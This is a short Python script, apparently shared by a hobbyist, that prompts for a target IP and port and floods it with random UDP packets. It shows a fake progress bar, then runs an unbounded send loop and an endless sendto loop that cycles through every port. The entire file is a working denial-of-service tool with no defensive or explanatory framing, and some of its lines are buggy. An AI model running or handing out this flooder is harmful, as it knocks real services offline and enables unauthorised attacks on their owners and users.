import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DoS Attack")
print
print ("Author: Sog#0001")
print ("GitHub: https://github.com/xcp3r")
print
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))

sock.connect((ip, port))
print(random._urandom(10)*1000)

os.system("clear")
os.system("figlet Starting Attack")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
for i in range(1, 100**1000):
    sock.send(random._urandom(10)*1000)
    print(f"Sent: {i}")

os.system("clear")
os.system("figlet Starting Attack")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
     if port == 65534:
       port = 1

